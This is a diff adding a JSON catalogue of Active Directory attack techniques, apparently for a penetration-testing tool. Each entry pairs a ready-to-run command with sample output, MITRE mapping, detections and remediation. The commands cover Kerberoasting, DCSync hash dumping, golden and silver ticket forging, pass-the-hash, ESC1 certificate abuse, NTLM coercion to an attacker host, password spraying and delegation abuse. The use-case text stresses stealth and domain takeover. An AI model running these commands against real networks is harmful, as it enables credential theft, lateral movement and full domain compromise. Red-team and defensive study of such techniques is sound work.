@@ -1,0 +1,838 @@
+[
+  {
+    "id": "kerberoast-rubeus",
+    "tool": "rubeus",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "windows"
+    ],
+    "command": "Rubeus.exe kerberoast /outfile:hashes.txt",
+    "name": "Kerberoasting (Rubeus)",
+    "description": "Requests TGS tickets for service accounts and extracts crackable hashes.",
+    "arguments": {
+      "kerberoast": "Request all SPNs",
+      "/outfile": "Save hashes"
+    },
+    "expected_output": "[*] Found 5 SPNs\n[*] SPN: MSSQLSvc/sql01.corp.local:1433 (svc_sql)\n[*] Hash: $krb5tgs$23$*svc_sql$...",
+    "use_case": "Extract service account password hashes \u2014 crack offline without detection.",
+    "prerequisites": [
+      "Domain user credentials"
+    ],
+    "mitre_mapping": [
+      "T1558.003"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "TGS requests for multiple SPNs (Event 4769)"
+    ],
+    "remediation": [
+      "Use gMSA",
+      "Long random service passwords",
+      "AES encryption"
+    ],
+    "common_mistakes": [
+      "No SPNs found"
+    ],
+    "alternatives": [
+      "GetUserSPNs.py (impacket)",
+      "PowerView"
+    ],
+    "references": [
+      "https://github.com/GhostPack/Rubeus"
+    ],
+    "tags": [
+      "kerberoast",
+      "spn",
+      "service-account",
+      "rubeus",
+      "tgs"
+    ]
+  },
+  {
+    "id": "asreproast-rubeus",
+    "tool": "rubeus",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "windows"
+    ],
+    "command": "Rubeus.exe asreproast /outfile:asrep_hashes.txt",
+    "name": "AS-REP Roasting (Rubeus)",
+    "description": "Finds accounts without Kerberos pre-authentication and extracts crackable AS-REP hashes.",
+    "arguments": {
+      "asreproast": "Find no-preauth accounts"
+    },
+    "expected_output": "[*] Found 2 accounts without pre-auth\n[*] User: svc_legacy\n[*] Hash: $krb5asrep$23$svc_legacy@CORP...",
+    "use_case": "Extract hashes from accounts with 'Do not require Kerberos preauthentication' \u2014 crack offline.",
+    "prerequisites": [
+      "Domain user credentials"
+    ],
+    "mitre_mapping": [
+      "T1558.004"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "AS-REQ without pre-auth (Event 4768)"
+    ],
+    "remediation": [
+      "Enable pre-authentication on all accounts",
+      "Strong passwords"
+    ],
+    "common_mistakes": [
+      "No accounts without pre-auth"
+    ],
+    "alternatives": [
+      "GetNPUsers.py (impacket)"
+    ],
+    "references": [
+      "https://github.com/GhostPack/Rubeus"
+    ],
+    "tags": [
+      "asreproast",
+      "pre-auth",
+      "kerberos",
+      "rubeus",
+      "offline"
+    ]
+  },
+  {
+    "id": "dcsync-secretsdump",
+    "tool": "impacket",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "secretsdump.py corp.local/admin:'Password1!'@<dc_ip>",
+    "name": "DCSync (Secretsdump)",
+    "description": "Replicates domain controller data to extract all password hashes \u2014 game over for AD.",
+    "arguments": {},
+    "expected_output": "[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435...:fc525c9683e8fe067095ba2ddc971889:::\nkrbtgt:502:aad3b435...:a]b2c3d4e5f6...",
+    "use_case": "Extract ALL domain password hashes \u2014 requires Domain Admin or replication rights.",
+    "prerequisites": [
+      "Domain Admin or DCSync rights"
+    ],
+    "mitre_mapping": [
+      "T1003.006"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "Replication traffic from non-DC (Event 4662)",
+      "DRS GetNCChanges"
+    ],
+    "remediation": [
+      "Monitor for DCSync",
+      "Restrict replication rights",
+      "Tiered admin model"
+    ],
+    "common_mistakes": [
+      "Insufficient privileges"
+    ],
+    "alternatives": [
+      "mimikatz lsadump::dcsync"
+    ],
+    "references": [
+      "https://github.com/fortra/impacket"
+    ],
+    "tags": [
+      "dcsync",
+      "secretsdump",
+      "domain-admin",
+      "hashes",
+      "game-over"
+    ]
+  },
+  {
+    "id": "golden-ticket",
+    "tool": "mimikatz",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "windows"
+    ],
+    "command": "mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<ntlm_hash> /ptt",
+    "name": "Golden Ticket Attack",
+    "description": "Forges Kerberos TGT using krbtgt hash \u2014 unlimited domain access for 10 years.",
+    "arguments": {
+      "/krbtgt": "krbtgt NTLM hash",
+      "/ptt": "Pass the ticket"
+    },
+    "expected_output": "[*] Golden ticket for 'fakeadmin @ corp.local' successfully submitted for current session",
+    "use_case": "Forge TGT for any user \u2014 complete domain compromise. Persists until krbtgt password changed twice.",
+    "prerequisites": [
+      "krbtgt NTLM hash (from DCSync)"
+    ],
+    "mitre_mapping": [
+      "T1558.001"
+    ],
+    "mitre_tactic": "Persistence",
+    "detections": [
+      "TGT with unusual lifetime",
+      "Non-existent user in TGT"
+    ],
+    "remediation": [
+      "Change krbtgt password twice",
+      "Monitor for anomalous tickets"
+    ],
+    "common_mistakes": [
+      "krbtgt hash not available"
+    ],
+    "alternatives": [
+      "silver ticket (per-service)"
+    ],
+    "references": [
+      "https://adsecurity.org/?p=1640"
+    ],
+    "tags": [
+      "golden-ticket",
+      "krbtgt",
+      "persistence",
+      "kerberos",
+      "forge"
+    ]
+  },
+  {
+    "id": "silver-ticket",
+    "tool": "mimikatz",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "windows"
+    ],
+    "command": "mimikatz # kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /target:sql01.corp.local /service:MSSQLSvc /rc4:<service_hash> /ptt",
+    "name": "Silver Ticket Attack",
+    "description": "Forges TGS for specific service \u2014 doesn't touch DC, harder to detect than golden ticket.",
+    "arguments": {
+      "/target": "Target server",
+      "/service": "Service name",
+      "/rc4": "Service account hash"
+    },
+    "expected_output": "[*] Silver ticket for MSSQLSvc/sql01.corp.local successfully submitted",
+    "use_case": "Access specific service without touching DC \u2014 stealthier than golden ticket.",
+    "prerequisites": [
+      "Service account NTLM hash"
+    ],
+    "mitre_mapping": [
+      "T1558.002"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "TGS without corresponding TGT request at DC"
+    ],
+    "remediation": [
+      "Use gMSA",
+      "Rotate service passwords",
+      "PAC validation"
+    ],
+    "common_mistakes": [
+      "Service account hash not available"
+    ],
+    "alternatives": [
+      "golden ticket"
+    ],
+    "references": [
+      "https://adsecurity.org/?p=2011"
+    ],
+    "tags": [
+      "silver-ticket",
+      "tgs",
+      "stealth",
+      "service",
+      "forge"
+    ]
+  },
+  {
+    "id": "pass-the-hash",
+    "tool": "impacket",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "psexec.py -hashes :fc525c9683e8fe067095ba2ddc971889 corp.local/admin@<target>",
+    "name": "Pass the Hash (Impacket)",
+    "description": "Authenticates using NTLM hash without knowing the password \u2014 lateral movement.",
+    "arguments": {
+      "-hashes :hash": "LM:NT hash format (empty LM)"
+    },
+    "expected_output": "[*] Requesting shares on target...\n[*] Found writable share ADMIN$\n[*] Uploading file...\nC:\\Windows\\system32>whoami\ncorp\\admin",
+    "use_case": "Move laterally using captured NTLM hashes \u2014 no password cracking needed.",
+    "prerequisites": [
+      "NTLM hash",
+      "Local admin on target"
+    ],
+    "mitre_mapping": [
+      "T1550.002"
+    ],
+    "mitre_tactic": "Lateral Movement",
+    "detections": [
+      "NTLM auth without corresponding password logon",
+      "Event 4624 type 3"
+    ],
+    "remediation": [
+      "Disable NTLM",
+      "Enable Credential Guard",
+      "Restrict local admin"
+    ],
+    "common_mistakes": [
+      "Target requires Kerberos only"
+    ],
+    "alternatives": [
+      "crackmapexec",
+      "evil-winrm -H"
+    ],
+    "references": [
+      "https://github.com/fortra/impacket"
+    ],
+    "tags": [
+      "pass-the-hash",
+      "pth",
+      "ntlm",
+      "lateral",
+      "impacket"
+    ]
+  },
+  {
+    "id": "pass-the-ticket",
+    "tool": "rubeus",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "windows"
+    ],
+    "command": "Rubeus.exe ptt /ticket:ticket.kirbi",
+    "name": "Pass the Ticket",
+    "description": "Injects a Kerberos ticket into the current session \u2014 access resources as that user.",
+    "arguments": {
+      "/ticket": "Base64 or file path to ticket"
+    },
+    "expected_output": "[*] Ticket successfully imported\n[*] Now accessing resources as admin@corp.local",
+    "use_case": "Use stolen Kerberos tickets for lateral movement \u2014 works even when NTLM is disabled.",
+    "prerequisites": [
+      "Valid Kerberos ticket (from dump or forge)"
+    ],
+    "mitre_mapping": [
+      "T1550.003"
+    ],
+    "mitre_tactic": "Lateral Movement",
+    "detections": [
+      "Ticket used from unusual source",
+      "Ticket reuse"
+    ],
+    "remediation": [
+      "Short ticket lifetimes",
+      "Monitor ticket usage patterns"
+    ],
+    "common_mistakes": [
+      "Ticket expired"
+    ],
+    "alternatives": [
+      "mimikatz kerberos::ptt"
+    ],
+    "references": [
+      "https://github.com/GhostPack/Rubeus"
+    ],
+    "tags": [
+      "pass-the-ticket",
+      "kerberos",
+      "lateral",
+      "rubeus",
+      "ptt"
+    ]
+  },
+  {
+    "id": "certifried-adcs",
+    "tool": "certipy",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "certipy find -u jsmith@corp.local -p 'Password1!' -dc-ip <dc_ip> -vulnerable",
+    "name": "Certipy AD CS Enumeration",
+    "description": "Finds vulnerable Active Directory Certificate Services templates for privilege escalation.",
+    "arguments": {
+      "-vulnerable": "Show only vulnerable templates"
+    },
+    "expected_output": "[*] Found vulnerable template: ESC1\n  Template: UserAuth\n  Enrollee: Domain Users\n  Can specify SAN: True\n  \u2192 Any domain user can request cert as Domain Admin!",
+    "use_case": "Find AD CS misconfigurations \u2014 often provides direct path to Domain Admin.",
+    "prerequisites": [
+      "Domain user credentials",
+      "AD CS deployed"
+    ],
+    "mitre_mapping": [
+      "T1649"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Certificate enrollment requests"
+    ],
+    "remediation": [
+      "Fix template permissions",
+      "Require manager approval"
+    ],
+    "common_mistakes": [
+      "No AD CS deployed"
+    ],
+    "alternatives": [
+      "Certify.exe (Windows)"
+    ],
+    "references": [
+      "https://github.com/ly4k/Certipy"
+    ],
+    "tags": [
+      "adcs",
+      "certipy",
+      "certificate",
+      "esc1",
+      "privilege-escalation"
+    ]
+  },
+  {
+    "id": "certipy-exploit-esc1",
+    "tool": "certipy",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "certipy req -u jsmith@corp.local -p 'Password1!' -ca CORP-CA -template UserAuth -upn admin@corp.local\ncertipy auth -pfx admin.pfx",
+    "name": "Certipy ESC1 Exploit",
+    "description": "Exploits ESC1 misconfiguration to get certificate as Domain Admin.",
+    "arguments": {
+      "-ca": "Certificate Authority",
+      "-template": "Vulnerable template",
+      "-upn": "Target user UPN"
+    },
+    "expected_output": "[*] Got certificate for admin@corp.local\n[*] Using certificate to authenticate...\n[*] Got TGT for admin@corp.local\n[*] Got NTLM hash: fc525c96...",
+    "use_case": "Escalate from domain user to Domain Admin via AD CS ESC1.",
+    "prerequisites": [
+      "Vulnerable ESC1 template",
+      "Domain user"
+    ],
+    "mitre_mapping": [
+      "T1649"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Certificate request with different UPN"
+    ],
+    "remediation": [
+      "Fix template permissions"
+    ],
+    "common_mistakes": [
+      "Template not vulnerable"
+    ],
+    "alternatives": [
+      "Certify.exe + Rubeus"
+    ],
+    "references": [
+      "https://github.com/ly4k/Certipy"
+    ],
+    "tags": [
+      "adcs",
+      "esc1",
+      "exploit",
+      "domain-admin",
+      "certificate"
+    ]
+  },
+  {
+    "id": "petitpotam-coerce",
+    "tool": "petitpotam",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "python3 PetitPotam.py <attacker_ip> <dc_ip>",
+    "name": "PetitPotam (NTLM Coercion)",
+    "description": "Coerces DC to authenticate to attacker \u2014 combine with NTLM relay for instant DA.",
+    "arguments": {},
+    "expected_output": "[*] Triggering EfsRpcOpenFileRaw on DC...\n[+] DC authenticated to our server!\n[+] Relay to AD CS \u2192 Domain Admin certificate obtained",
+    "use_case": "Force DC authentication for relay attacks \u2014 one of the most powerful AD attacks.",
+    "prerequisites": [
+      "Network access to DC",
+      "Relay target (AD CS or other)"
+    ],
+    "mitre_mapping": [
+      "T1187"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "EFS RPC calls to external hosts",
+      "NTLM auth from DC to non-DC"
+    ],
+    "remediation": [
+      "Disable NTLM on DCs",
+      "Enable EPA",
+      "Patch EFS"
+    ],
+    "common_mistakes": [
+      "EFS patched",
+      "NTLM disabled on DC"
+    ],
+    "alternatives": [
+      "Coercer",
+      "DFSCoerce",
+      "PrinterBug"
+    ],
+    "references": [
+      "https://github.com/topotam/PetitPotam"
+    ],
+    "tags": [
+      "petitpotam",
+      "coercion",
+      "ntlm",
+      "relay",
+      "domain-admin"
+    ]
+  },
+  {
+    "id": "coercer-all",
+    "tool": "coercer",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "coercer coerce -u jsmith -p 'Password1!' -d corp.local -t <dc_ip> -l <attacker_ip>",
+    "name": "Coercer (All Coercion Methods)",
+    "description": "Tests all known NTLM coercion methods \u2014 PetitPotam, PrinterBug, DFSCoerce, etc.",
+    "arguments": {
+      "-t": "Target to coerce",
+      "-l": "Listener (attacker)"
+    },
+    "expected_output": "[+] MS-EFSR (PetitPotam): VULNERABLE\n[+] MS-RPRN (PrinterBug): VULNERABLE\n[-] MS-DFSNM: Not vulnerable",
+    "use_case": "Test all coercion vectors at once \u2014 find which methods work for relay attacks.",
+    "prerequisites": [
+      "Domain credentials",
+      "Network access"
+    ],
+    "mitre_mapping": [
+      "T1187"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "RPC calls triggering outbound auth"
+    ],
+    "remediation": [
+      "Patch all coercion vectors",
+      "Disable NTLM"
+    ],
+    "common_mistakes": [
+      "All methods patched"
+    ],
+    "alternatives": [
+      "PetitPotam",
+      "SpoolSample",
+      "DFSCoerce"
+    ],
+    "references": [
+      "https://github.com/p0dalirius/Coercer"
+    ],
+    "tags": [
+      "coercer",
+      "coercion",
+      "all-methods",
+      "ntlm",
+      "relay"
+    ]
+  },
+  {
+    "id": "crackmapexec-spray",
+    "tool": "netexec",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "netexec smb <dc_ip> -u users.txt -p 'Summer2024!' --continue-on-success",
+    "name": "NetExec Password Spray (SMB)",
+    "description": "Sprays password against domain users via SMB \u2014 shows which accounts are valid.",
+    "arguments": {
+      "--continue-on-success": "Don't stop at first hit"
+    },
+    "expected_output": "SMB  10.0.0.1  445  DC01  [+] corp.local\\jsmith:Summer2024!\nSMB  10.0.0.1  445  DC01  [+] corp.local\\helpdesk:Summer2024!",
+    "use_case": "Domain password spray via SMB \u2014 identifies accounts with weak passwords.",
+    "prerequisites": [
+      "User list",
+      "SMB accessible"
+    ],
+    "mitre_mapping": [
+      "T1110.003"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "Multiple failed logins (Event 4625)",
+      "Spray pattern"
+    ],
+    "remediation": [
+      "Account lockout",
+      "Ban common passwords",
+      "MFA"
+    ],
+    "common_mistakes": [
+      "Account lockout triggered"
+    ],
+    "alternatives": [
+      "kerbrute (no lockout risk)",
+      "sprayhound"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec"
+    ],
+    "tags": [
+      "spray",
+      "smb",
+      "netexec",
+      "domain",
+      "password"
+    ]
+  },
+  {
+    "id": "impacket-wmiexec",
+    "tool": "impacket",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "wmiexec.py corp.local/admin:'Password1!'@<target>",
+    "name": "WMIExec (Stealthy Lateral Movement)",
+    "description": "Executes commands via WMI \u2014 doesn't create a service (stealthier than PsExec).",
+    "arguments": {},
+    "expected_output": "[*] SMBv3.0 dialect used\nC:\\>whoami\ncorp\\admin",
+    "use_case": "Stealthier lateral movement \u2014 uses WMI instead of creating services.",
+    "prerequisites": [
+      "Valid credentials",
+      "WMI accessible"
+    ],
+    "mitre_mapping": [
+      "T1047"
+    ],
+    "mitre_tactic": "Lateral Movement",
+    "detections": [
+      "WMI activity (Event 4688 with wmiprvse parent)"
+    ],
+    "remediation": [
+      "Restrict WMI access",
+      "Monitor WMI usage"
+    ],
+    "common_mistakes": [
+      "WMI blocked by firewall"
+    ],
+    "alternatives": [
+      "psexec",
+      "smbexec",
+      "atexec"
+    ],
+    "references": [
+      "https://github.com/fortra/impacket"
+    ],
+    "tags": [
+      "wmiexec",
+      "wmi",
+      "stealth",
+      "lateral",
+      "impacket"
+    ]
+  },
+  {
+    "id": "impacket-smbexec",
+    "tool": "impacket",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "smbexec.py corp.local/admin:'Password1!'@<target>",
+    "name": "SMBExec (Semi-Interactive Shell)",
+    "description": "Creates a service that echoes commands to a file \u2014 semi-interactive shell via SMB.",
+    "arguments": {},
+    "expected_output": "[!] Launching semi-interactive shell\nC:\\Windows\\system32>whoami\ncorp\\admin",
+    "use_case": "Alternative to PsExec \u2014 different detection signature.",
+    "prerequisites": [
+      "Valid credentials",
+      "SMB accessible",
+      "Local admin"
+    ],
+    "mitre_mapping": [
+      "T1021.002"
+    ],
+    "mitre_tactic": "Lateral Movement",
+    "detections": [
+      "Service creation",
+      "File writes to ADMIN$"
+    ],
+    "remediation": [
+      "Monitor service creation",
+      "Restrict ADMIN$ access"
+    ],
+    "common_mistakes": [
+      "SMB signing required without valid creds"
+    ],
+    "alternatives": [
+      "wmiexec",
+      "psexec",
+      "atexec"
+    ],
+    "references": [
+      "https://github.com/fortra/impacket"
+    ],
+    "tags": [
+      "smbexec",
+      "lateral",
+      "smb",
+      "service",
+      "impacket"
+    ]
+  },
+  {
+    "id": "laps-dump",
+    "tool": "netexec",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "netexec ldap <dc_ip> -u jsmith -p 'Password1!' -M laps",
+    "name": "LAPS Password Dump",
+    "description": "Reads Local Administrator Password Solution (LAPS) passwords from AD \u2014 instant local admin.",
+    "arguments": {
+      "-M laps": "LAPS module"
+    },
+    "expected_output": "LAPS  10.0.0.1  DC01  [+] PC01: Administrator:Xk9#mP2$vL7!",
+    "use_case": "Read LAPS passwords if you have the right AD permissions \u2014 instant local admin on workstations.",
+    "prerequisites": [
+      "LAPS read permissions",
+      "Domain credentials"
+    ],
+    "mitre_mapping": [
+      "T1003"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "LAPS attribute read (Event 4662)"
+    ],
+    "remediation": [
+      "Restrict LAPS read permissions",
+      "Audit LAPS access"
+    ],
+    "common_mistakes": [
+      "No LAPS read permissions"
+    ],
+    "alternatives": [
+      "Get-LAPSPasswords.ps1",
+      "ldapsearch"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec"
+    ],
+    "tags": [
+      "laps",
+      "local-admin",
+      "password",
+      "active-directory",
+      "netexec"
+    ]
+  },
+  {
+    "id": "constrained-delegation",
+    "tool": "rubeus",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "windows"
+    ],
+    "command": "Rubeus.exe s4u /user:svc_web /rc4:<hash> /impersonateuser:admin /msdsspn:cifs/fileserver.corp.local /ptt",
+    "name": "Constrained Delegation Abuse",
+    "description": "Abuses constrained delegation to impersonate any user to allowed services.",
+    "arguments": {
+      "/user": "Delegated account",
+      "/impersonateuser": "User to impersonate",
+      "/msdsspn": "Target SPN"
+    },
+    "expected_output": "[*] S4U2Self: Got TGS for admin to svc_web\n[*] S4U2Proxy: Got TGS for admin to cifs/fileserver\n[*] Ticket imported",
+    "use_case": "Impersonate Domain Admin to specific services via constrained delegation.",
+    "prerequisites": [
+      "Account with constrained delegation",
+      "Account hash"
+    ],
+    "mitre_mapping": [
+      "T1134"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "S4U2Self/S4U2Proxy requests (Event 4769)"
+    ],
+    "remediation": [
+      "Minimize delegation",
+      "Use RBCD instead"
+    ],
+    "common_mistakes": [
+      "No delegated accounts found"
+    ],
+    "alternatives": [
+      "getST.py (impacket)"
+    ],
+    "references": [
+      "https://github.com/GhostPack/Rubeus"
+    ],
+    "tags": [
+      "delegation",
+      "constrained",
+      "s4u",
+      "impersonate",
+      "kerberos"
+    ]
+  },
+  {
+    "id": "resource-based-delegation",
+    "tool": "impacket",
+    "category": "active_directory",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "# Add RBCD:\nrbcd.py -delegate-from YOURPC$ -delegate-to TARGET$ -dc-ip <dc_ip> -action write corp.local/jsmith:'Password1!'\n# Get ticket:\ngetST.py -spn cifs/TARGET.corp.local -impersonate admin corp.local/YOURPC$ -hashes :hash",
+    "name": "Resource-Based Constrained Delegation (RBCD)",
+    "description": "Abuses write permissions on computer objects to configure delegation and impersonate users.",
+    "arguments": {},
+    "expected_output": "[*] Delegation rights modified\n[*] Getting TGT for YOURPC$\n[*] Impersonating admin\n[*] Got TGS for admin to cifs/TARGET",
+    "use_case": "If you can write to a computer's msDS-AllowedToActOnBehalfOfOtherIdentity, you can impersonate any user.",
+    "prerequisites": [
+      "Write permission on target computer object",
+      "Computer account or hash"
+    ],
+    "mitre_mapping": [
+      "T1134"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "msDS-AllowedToActOnBehalfOfOtherIdentity modification",
+      "S4U requests"
+    ],
+    "remediation": [
+      "Restrict computer object write permissions",
+      "Monitor delegation changes"
+    ],
+    "common_mistakes": [
+      "No write permissions on computer objects"
+    ],
+    "alternatives": [
+      "Rubeus s4u"
+    ],
+    "references": [
+      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-target-exploitation"
+    ],
+    "tags": [
+      "rbcd",
+      "resource-based",
+      "delegation",
+      "computer",
+      "write"
+    ]
+  }
+]
